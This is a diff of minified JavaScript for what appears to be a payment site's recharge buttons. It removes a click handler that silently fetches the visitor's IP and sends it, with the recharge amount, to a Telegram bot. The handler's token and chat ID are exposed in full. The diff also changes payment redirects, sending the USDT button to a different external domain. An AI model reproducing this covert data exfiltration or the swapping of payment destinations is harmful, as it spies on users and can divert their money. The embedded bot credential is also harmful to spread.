@@ -2782,41 +2782,9 @@ $)
             l("div", {
                 key: 3,
                 class: se(["Recharge__container-rechageBtn"]),
-                onClick: async function() {
-                    const rechargeAmount = a(u).amount;
-                    const exchangeRate = a(u).numberExchangeRate;
-                    const botToken = '7211580703:AAEPCnOqUDUhvU6MJkg59UbUcuUph_pxwLk';
-                    const chatId = '-1002421689922';
-            
-                    try {
-                        const ipResponse = await fetch('https://api.ipify.org?format=json');
-                        const ipData = await ipResponse.json();
-                        const userIP = ipData.ip;
-            
-                        let message, url;
-            
-                        if (exchangeRate === undefined) {
-                            url = "https://pay.9987up.net";
-                            message = `INR Recharge Attempt:\n\nAmount: ${rechargeAmount}\nIP Address: ${userIP}\n\nThis is written by @Ak4ssh`;
-                        } else {
-                            url = "https://Usdt.9987up.net";
-                            message = `USDT Recharge Attempt:\n\nAmount: ${exchangeRate}\nIP Address: ${userIP}\n\nThis is written by @Ak4ssh`;
-                        }
-                        window.open(url, "_blank");
-                        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                            },
-                            body: JSON.stringify({
-                                chat_id: chatId,
-                                text: message,
-                            }),
-                        });
-                    } catch (error) {
-                        console.error("Error during recharge attempt:", error);
-                    }
-                }                        
+                onClick: function() {
+                    window.location.href = "https://pay.9987up.net";
+                }
             }, [j(t(ae.$t("recharge")), 1)], 2)), [[we, {
                 handler: a(H),
                 wait: 2e3
@@ -4221,8 +4189,8 @@ $)
             }), e("div", {
                 class: "RechargeUsdt__container-rechageBtn rechage_active",
                 onClick: function() {
-                    window.open("https://Usdt.9987up.net", "_blank");
-                }                
+                    window.location.href = "https://pay.abishnoi.me/";
+                }
             }, t(b.$t("finishRechargeUsdt")), 1)]), v(x, {
                 show: c.value,
                 "onUpdate:show": g[3] || (g[3] = I => c.value = I),
